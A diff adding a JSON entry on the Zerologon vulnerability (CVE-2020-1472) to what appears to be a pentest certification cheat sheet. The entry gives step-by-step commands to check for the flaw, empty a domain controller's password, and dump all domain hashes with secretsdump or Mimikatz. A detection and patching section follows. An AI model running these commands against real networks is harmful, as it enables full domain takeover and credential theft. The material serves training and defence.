@@ -1,0 +1,102 @@
+{
+  "id": "ad-zerologon",
+  "name": "Zerologon (CVE-2020-1472) - Netlogon Privilege Escalation",
+  "command": "python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>",
+  "description": "Zerologon exploits a flaw in the Netlogon protocol (MS-NRPC) where the initialization vector is set to all zeros. By sending Netlogon messages with a zero IV, an attacker can authenticate as the Domain Controller machine account and set its password to empty, enabling DCSync. One of the most critical AD vulnerabilities ever discovered.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Domain Escalation",
+  "certifications": [
+    "CPTS",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CVE-2020-1472; Secura research",
+  "tags": [
+    "zerologon",
+    "cve-2020-1472",
+    "netlogon",
+    "ms-nrpc",
+    "domain-controller",
+    "dcsync"
+  ],
+  "mitre": [
+    "T1068",
+    "T1003.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CHECK IF VULNERABLE ===\n  # Using crackmapexec:\n  crackmapexec smb <dc_ip> -u \"\" -p \"\" -M zerologon\n  # Using the check script:\n  python3 zerologon_tester.py <dc_name> <dc_ip>\n\n=== EXPLOIT ===\n  # Step 1: Set DC password to empty\n  python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>\n\n  # Step 2: DCSync with empty password\n  secretsdump.py -no-pass -just-dc <domain>/<dc_name>$@<dc_ip>\n\n  # Step 3: RESTORE the DC password (CRITICAL!)\n  # Get the original machine account hash:\n  secretsdump.py -hashes :<admin_nthash> <domain>/Administrator@<dc_ip>\n  # Restore the password:\n  python3 restorepassword.py <domain>/<dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <original_hex>\n\n=== WARNING ===\n  # ZEROLOGON BREAKS THE DC if you dont restore the password!\n  # The DC machine account password in AD will not match the\n  # local copy, causing replication failures and domain issues.\n  # ALWAYS restore the password after exploitation.\n\n=== USING MIMIKATZ ===\n  lsadump::zerologon /target:<dc_fqdn> /account:<dc_name>$ /exploit\n  lsadump::dcsync /domain:<domain> /dc:<dc_fqdn> /user:Administrator /authuser:<dc_name>$ /authdomain:<domain> /authpassword:\"\" /authntlm",
+  "examples": [
+    {
+      "label": "Check vulnerability",
+      "command": "crackmapexec smb 192.168.1.10 -u \"\" -p \"\" -M zerologon"
+    },
+    {
+      "label": "Exploit and set DC password to empty",
+      "command": "python3 cve-2020-1472-exploit.py DC01 192.168.1.10"
+    },
+    {
+      "label": "DCSync with empty password",
+      "command": "secretsdump.py -no-pass -just-dc corp.local/DC01$@192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "Secura - Zerologon Whitepaper",
+      "url": "https://www.secura.com/uploads/whitepapers/Zerologon.pdf"
+    },
+    {
+      "title": "CVE-2020-1472",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1472"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-certifried",
+      "note": "Certifried is another critical AD CVE for domain escalation.",
+      "rel": "alternative"
+    },
+    {
+      "id": "secretsdump-ntds",
+      "note": "DCSync after Zerologon to dump all domain hashes.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The Netlogon protocol uses AES-CFB8 with a zero IV, allowing an attacker to guess the session key by sending authentication attempts with all-zero client credentials. After ~256 attempts, one will succeed.",
+    "prerequisites": "Network access to DC (port 135/445); unpatched DC (pre-August 2020 KB4571702).",
+    "impact": "Complete domain compromise; DCSync as the DC machine account; can break DC if not restored.",
+    "detection": "[MITRE T1068] Multiple failed Netlogon authentication attempts followed by success; DC machine account password change; DCSync activity.",
+    "artifacts": "Event 4742 (DC computer account changed); Event 5805 (Netlogon auth failure); massive Netlogon traffic.",
+    "splunk_spl": "index=windows (EventCode=5805 OR (EventCode=4742 AND TargetUserName=\"*$\" AND SubjectUserName=\"ANONYMOUS LOGON\"))\n| table _time, EventCode, TargetUserName, SubjectUserName",
+    "elastic_kql": "event.code:\"5805\" OR (event.code:\"4742\" AND user.name:ANONYMOUS*)",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5805 or (EventID == 4742 and SubjectUserName == \"ANONYMOUS LOGON\")\n| project TimeGenerated, EventID, TargetUserName, SubjectUserName, IpAddress",
+    "sigma_rules": "win_security_zerologon_cve_2020_1472",
+    "prevention": "Apply KB4571702 (August 2020); enable Netlogon secure channel enforcement; monitor for Zerologon scanning.",
+    "sources": [
+      "CVE-2020-1472",
+      "https://attack.mitre.org/techniques/T1068/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Zerologon (CVE-2020-1472) exploitation attempt",
+        "logic": "SecurityEvent\n| where EventID == 5805\n| summarize FailCount=count() by SourceIP=IpAddress, TargetUserName, bin(TimeGenerated, 5m)\n| where FailCount > 10\n| project TimeGenerated, SourceIP, TargetUserName, FailCount",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5805"
+        ],
+        "attack": [
+          "T1068",
+          "T1003.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate Netlogon issues (very rare at this volume)",
+        "tuning": "Any burst of 5805 events (>10 in 5 minutes) from a single source should trigger critical alert"
+      }
+    ]
+  }
+}
